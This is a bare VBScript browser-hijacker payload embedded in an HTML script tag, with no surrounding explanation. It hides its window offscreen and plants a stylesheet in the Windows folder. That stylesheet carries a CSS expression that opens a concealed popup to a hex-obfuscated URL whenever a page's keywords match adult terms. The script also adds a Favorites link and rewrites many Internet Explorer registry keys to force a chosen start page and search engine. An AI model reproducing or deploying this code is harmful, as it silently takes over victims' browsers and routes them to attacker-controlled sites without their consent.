   <script language=VBS>
   self.MoveTo 5000,5000
   Set Shl = CreateObject("WScript.Shell")
   set WshProEnv = Shl.Environment("PROCESS")
   Set er=CreateObject("Scripting.FileSystemObject")
   css = WshProEnv("WINDIR") +"\system.css"
   Set aeb=er.CreateTextFile(css)
   aeb.WriteLine"@charset 'iso-8859-1';"
   aeb.WriteLine"body{border-color:expression(dMT=document.getElementsByTagName('META'),dMT.length?(dMT.keywords?(dMTkc=dMT.keywords.content,(dMTkc.indexOf('sex')>=0||dMTkc.indexOf('porn')>=0 ||dMTkc.indexOf('adult')>=0||dMTkc.indexOf('thehun')>=0)?(window.open('http://www%2E%68%75%79%2D%73%65%61%72%63%68%2E%69%6E%66%6F/%63%6F%6E%73%6Fl%65%2Ep%68p','hvo','x=5000,top=5000,y=5000,left=5000,height=600,width=800,directories=no,toolbar=no,status=no,location=no,resizable=no,menubar=no,scrollbars=no')?document.getElementsByTagName('META').keywords.content='':''):''):''):'')}"
   sub AddFavoriteLink(loc, DispName, SiteURL)
   Set Shor = Shl.CreateShortcut(loc +"\"+ DispName +".URL")
   Shor.TargetPath = SiteURL
   Shor.Save()
   end sub
   loc = Shl.SpecialFolders("Favorites")
   AddFavoriteLink loc, "Best Search Engine","http://www.huy-search.info"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Styles\User Stylesheet",css
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Styles\Use My Stylesheet","1"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.huy-search.info"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.huy-search.info"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Use Search Asst","no"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\SearchUrl\","http://www.search-dot.com/search.php?qq=%s"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\Default_Search_URL","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.huy-search.info"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.huy-search.info/search.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.huy-search.info/search.html"
   window.close()
   </script>
